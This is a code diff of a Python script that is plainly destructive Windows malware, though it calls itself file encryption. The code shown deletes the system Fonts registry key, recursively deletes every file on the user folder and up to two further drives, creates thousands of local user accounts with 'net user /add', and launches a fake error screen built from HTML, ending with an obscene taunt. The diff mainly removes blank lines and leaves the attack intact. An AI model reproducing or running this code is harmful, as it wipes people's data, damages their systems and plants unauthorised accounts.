@@ -49,9 +49,7 @@ varie = '''<html><head><title>BSOD</title>
  <p>.`````````````````````````````````````````````````Y8P`````````````````````````````````````````````````</p> 
  </font> 
  </body></html> '''
-
 os.system('cmd /c "REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /va /f"')
-
 def encrypt_drive_1_files():
     path = user_c_path
     files = []
@@ -59,16 +57,13 @@ def encrypt_drive_1_files():
         for file in f:
             if '.' in file:
                 files.append(os.path.join(r, file))
-
     for f in files:
         print(f)
         try:
             os.remove(f)
         except:
             print("BRUHH")
-
 encrypt_drive_1_files()
-
 try:
     def encrypt_drive_2_files():
         drive_2 = drives[1]
@@ -78,20 +73,15 @@ try:
             for file in f:
                 if '.' in file:
                     files.append(os.path.join(r, file))
-
         for f in files:
             print(f)
-
             try:
                 os.remove(f)
             except:
                 print("BRUHH")
-
     encrypt_drive_2_files()
-
 except:
     print(".")
-
 try:
     def encrypt_drive_3_files():
         drive_3 = drives[2]
@@ -101,21 +91,15 @@ try:
             for file in f:
                 if '.' in file:
                     files.append(os.path.join(r, file))
-
         for f in files:
             print(f)
-
             try:
                 os.remove(f)
             except:
                 print("BRUHH")
-        
-
     encrypt_drive_3_files()
-
 except:
     print(".")
-
 for z in range(1, 4096) :
     i = 0
     number = random.randint(5, 5)
@@ -129,14 +113,10 @@ for z in range(1, 4096) :
             command = 'net user /add ' + user + password
             os.system(command)
         create_remote_user()
-
-    
-
 def RSOD():
     file = cwd + 'rsod.hta'
     with open(file, 'wb') as r:
-        r.write(varie)
+        r.write(bytes(varie))
     os.startfile(file)
 RSOD()
-
 print ("YOU BEEN FUCKED !!!!")
